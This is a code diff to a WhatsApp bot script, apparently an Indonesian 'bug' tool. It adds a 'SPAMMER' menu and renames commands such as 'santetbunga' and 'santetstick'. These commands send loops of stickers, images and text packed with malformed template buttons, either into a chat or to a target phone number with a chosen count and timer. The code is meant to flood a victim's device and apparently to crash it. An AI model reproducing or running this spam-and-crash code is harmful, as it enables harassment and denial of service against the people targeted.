@@ -195,7 +195,7 @@ user.afkReason = ''
 
 switch(command) {
 
-case '☠': {
+case 'bungapc': {
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 cannx = `By Carosatzx`
@@ -220,12 +220,13 @@ cann.sendMessage(m.chat, { text: '', templateButtons: [
 }
 }
 break
-case 'damnz': {
+/*
+case '': {
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 cannx = `By Carosatzx`
 for (let i = 0; i < jumlah; i++) {
-cann.sendMessage(m.chat, {sticker: fs.readFileSync('./src/stick.webp'), templateButtons: [
+cann.sendMessage(m.chat, { sticker: fs.readFileSync('./src/stick.webp'), templateButtons: [
 { callButton: { displayText: ``, phoneNumber: '666'}},
 { callButton: { displayText: ``, phoneNumber: '666'}},
 { urlButton: { displayText: `TheCarosatzx`, url: '666'}},
@@ -245,9 +246,9 @@ cann.sendMessage(m.chat, {sticker: fs.readFileSync('./src/stick.webp'), template
 }
 }
 break
-
-
-case 'otwsantet': {
+*/
+/============================================/
+case 'santetbunga': {
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888xxxx|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
@@ -273,7 +274,7 @@ cann.sendMessage(`${num}@s.whatsapp.net`, { text: 'TheCarosatzx', templateButton
 }
 }
 break
-
+/============================================/
 case 'santetstick': {
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888xxxx|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
@@ -315,9 +316,8 @@ participant: `0@s.whatsapp.net`,
 }
 }
 break
-
-
-case '💣': {
+/============================================/
+case 'stickpc': {
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 cannx = `By Carosatzx`
@@ -357,7 +357,43 @@ participant: `0@s.whatsapp.net`,
 }
 }
 break
+/============================================/
+case 'imagepc': {
+cannx = `By Carosatzx 666`
+cann.sendMessage(m.chat, { image: fs.readFileSync('./src/menu.jpg'), caption: `hallo`, templateButtons: [
+{ callButton: { displayText: ``, phoneNumber: '666'}},
+{ callButton: { displayText: ``, phoneNumber: '666'}},
+{ urlButton: { displayText: `TheCarosatzx`, url: '666'}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
+]})
+}
+break
+/============================================/
+case 'Bugmenu': {
+cann.sendMessage(m.chat, { text: `─✪「𝗦𝗣𝗔𝗠𝗠𝗘𝗥」✪
+│⧉ .stickpc [Jumlah]
+│⧉ .bungapc [Jumlah]
+│⧉ .santetstick [Nomor|Jumlah]
+│⧉ .santetbunga[Nomor|Jumlah]
+└─❶`,
+templateButtons: [
+{ urlButton: { displayText: `O W N E R`, url: 'https://wa.me/687995757'}},
+]})
+}
+break
 
+/============================================/
 default:
 if (budy.startsWith('=>')) {
 if (!isCreator) return
